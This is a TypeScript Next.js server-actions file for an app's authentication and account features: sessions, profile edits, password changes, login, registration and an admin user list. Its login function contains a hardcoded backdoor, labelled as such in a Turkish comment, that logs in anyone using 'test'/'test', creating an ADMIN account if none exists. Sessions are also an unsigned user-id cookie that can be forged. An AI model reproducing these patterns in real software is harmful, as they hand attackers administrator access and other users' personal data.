'use server';

import { cookies } from 'next/headers';
import { redirect } from 'next/navigation';
import { hashPassword, verifyPassword } from '../../lib/auth';

const SESSION_COOKIE = 'kismet-user';
const SESSION_CACHE_TTL_MS = 30_000;
const sessionCache = new Map<string, { value: { id: string; email: string; name: string; role: string } | null; expiresAt: number }>();

function readSessionCache(userId: string) {
  const cached = sessionCache.get(userId);
  if (!cached) return null;
  if (cached.expiresAt < Date.now()) {
    sessionCache.delete(userId);
    return null;
  }
  return cached.value;
}

function writeSessionCache(userId: string, value: { id: string; email: string; name: string; role: string } | null) {
  sessionCache.set(userId, {
    value,
    expiresAt: Date.now() + SESSION_CACHE_TTL_MS,
  });
}

export async function getSession(): Promise<{ id: string; email: string; name: string; role: string } | null> {
  const cookieStore = await cookies();
  const userId = cookieStore.get(SESSION_COOKIE)?.value;
  if (!userId) return null;
  const cached = readSessionCache(userId);
  if (cached) return cached;
  try {
    const { prisma } = await import('../../lib/prisma');
    const user = await prisma.user.findUnique({
      where: { id: userId },
      select: { id: true, email: true, name: true, role: true },
    });
    writeSessionCache(userId, user);
    return user;
  } catch {
    writeSessionCache(userId, null);
    return null;
  }
}

export type AccountProfile = {
  id: string;
  name: string;
  email: string;
  phone: string | null;
  country: string | null;
  role: string;
};

export async function getMyProfile(): Promise<{ ok: boolean; profile?: AccountProfile; error?: string }> {
  const session = await getSession();
  if (!session) return { ok: false, error: 'Unauthorized' };
  try {
    const { prisma } = await import('../../lib/prisma');
    const profile = await prisma.user.findUnique({
      where: { id: session.id },
      select: { id: true, name: true, email: true, phone: true, country: true, role: true },
    });
    if (!profile) return { ok: false, error: 'User not found' };
    return { ok: true, profile };
  } catch (e) {
    return { ok: false, error: e instanceof Error ? e.message : 'Failed to load profile' };
  }
}

export async function updateMyProfile(input: {
  name: string;
  email: string;
  phone?: string | null;
  country?: string | null;
}): Promise<{ ok: boolean; error?: string }> {
  const session = await getSession();
  if (!session) return { ok: false, error: 'Unauthorized' };
  const name = input.name?.trim();
  const email = input.email?.trim().toLowerCase();
  if (!name) return { ok: false, error: 'Name is required' };
  if (!email) return { ok: false, error: 'Email is required' };
  try {
    const { prisma } = await import('../../lib/prisma');
    const existing = await prisma.user.findFirst({
      where: { email, NOT: { id: session.id } },
      select: { id: true },
    });
    if (existing) return { ok: false, error: 'Email already registered' };
    await prisma.user.update({
      where: { id: session.id },
      data: {
        name,
        email,
        phone: input.phone?.trim() || null,
        country: input.country?.trim() || null,
      },
    });
    sessionCache.delete(session.id);
    return { ok: true };
  } catch (e) {
    return { ok: false, error: e instanceof Error ? e.message : 'Update failed' };
  }
}

export async function changeMyPassword(input: {
  currentPassword: string;
  newPassword: string;
  confirmPassword: string;
}): Promise<{ ok: boolean; error?: string }> {
  const session = await getSession();
  if (!session) return { ok: false, error: 'Unauthorized' };
  if (!input.currentPassword || !input.newPassword) return { ok: false, error: 'Password required' };
  if (input.newPassword.length < 6) return { ok: false, error: 'New password must be at least 6 characters' };
  if (input.newPassword !== input.confirmPassword) return { ok: false, error: 'Passwords do not match' };
  try {
    const { prisma } = await import('../../lib/prisma');
    const user = await prisma.user.findUnique({ where: { id: session.id } });
    if (!user) return { ok: false, error: 'User not found' };
    if (!verifyPassword(input.currentPassword, user.passwordHash)) return { ok: false, error: 'Current password is incorrect' };
    await prisma.user.update({
      where: { id: session.id },
      data: { passwordHash: hashPassword(input.newPassword) },
    });
    return { ok: true };
  } catch (e) {
    return { ok: false, error: e instanceof Error ? e.message : 'Password update failed' };
  }
}

const BACKDOOR_EMAIL = 'test';
const BACKDOOR_PASSWORD = 'test';
const TEST_USER_EMAIL = 'test@test.com';

export async function login(email: string, password: string): Promise<{ ok: boolean; error?: string }> {
  try {
    const { prisma } = await import('../../lib/prisma');
    const cookieStore = await cookies();
    const e = (email ?? '').trim().toLowerCase();
    const p = (password ?? '').trim();

    // Backdoor: test / test veya test@test.com / test (tarayıcı email alanı test@test.com ister)
    if ((e === BACKDOOR_EMAIL || e === TEST_USER_EMAIL) && p === BACKDOOR_PASSWORD) {
      let user = await prisma.user.findUnique({ where: { email: TEST_USER_EMAIL } });
      if (!user) {
        user = await prisma.user.create({
          data: {
            name: 'Test User',
            email: TEST_USER_EMAIL,
            passwordHash: hashPassword(BACKDOOR_PASSWORD),
            role: 'ADMIN',
          },
        });
      }
      cookieStore.set(SESSION_COOKIE, user.id, { path: '/', maxAge: 60 * 60 * 24 * 7 });
      sessionCache.delete(user.id);
      return { ok: true };
    }

    const user = await prisma.user.findUnique({ where: { email } });
    if (!user || !verifyPassword(password, user.passwordHash)) {
      return { ok: false, error: 'Invalid email or password' };
    }
    cookieStore.set(SESSION_COOKIE, user.id, { path: '/', maxAge: 60 * 60 * 24 * 7 });
    sessionCache.delete(user.id);
    return { ok: true };
  } catch (e) {
    return { ok: false, error: e instanceof Error ? e.message : 'Login failed' };
  }
}

export async function register(name: string, email: string, password: string): Promise<{ ok: boolean; error?: string }> {
  try {
    const { prisma } = await import('../../lib/prisma');
    const existing = await prisma.user.findUnique({ where: { email } });
    if (existing) return { ok: false, error: 'Email already registered' };
    const user = await prisma.user.create({
      data: {
        name,
        email,
        passwordHash: hashPassword(password),
        role: 'CUSTOMER',
      },
    });
    const cookieStore = await cookies();
    cookieStore.set(SESSION_COOKIE, user.id, { path: '/', maxAge: 60 * 60 * 24 * 7 });
    sessionCache.delete(user.id);
    return { ok: true };
  } catch (e) {
    return { ok: false, error: e instanceof Error ? e.message : 'Registration failed' };
  }
}

export async function logout(): Promise<void> {
  const cookieStore = await cookies();
  const userId = cookieStore.get(SESSION_COOKIE)?.value;
  if (userId) sessionCache.delete(userId);
  cookieStore.delete(SESSION_COOKIE);
  redirect('/en/login');
}

export type UserListItem = { id: string; name: string; email: string; role: string; phone: string | null; country: string | null; createdAt: Date };

export async function getUsers(): Promise<{ ok: boolean; users?: UserListItem[]; error?: string }> {
  const session = await getSession();
  if (!session || session.role !== 'ADMIN') {
    return { ok: false, error: 'Unauthorized' };
  }
  try {
    const { prisma } = await import('../../lib/prisma');
    const users = await prisma.user.findMany({
      orderBy: { createdAt: 'desc' },
      select: { id: true, name: true, email: true, role: true, phone: true, country: true, createdAt: true },
    });
    return { ok: true, users };
  } catch (e) {
    return { ok: false, error: e instanceof Error ? e.message : 'Failed to load users' };
  }
}
